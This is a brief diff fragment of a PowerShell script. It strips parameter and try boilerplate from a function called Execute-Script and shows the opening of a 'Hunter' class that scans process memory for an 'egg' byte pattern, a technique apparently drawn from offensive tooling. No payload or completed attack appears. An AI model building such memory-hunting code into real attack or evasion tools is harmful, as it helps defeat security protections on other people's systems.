@@ -1,8 +1,4 @@
 function Execute-Script {
-    [CmdletBinding()]
-    param()
-
-    try {
         class Hunter {
             static [System.IntPtr] FindAddress([System.IntPtr]$address, [byte[]]$egg) {
                 while ($true) {
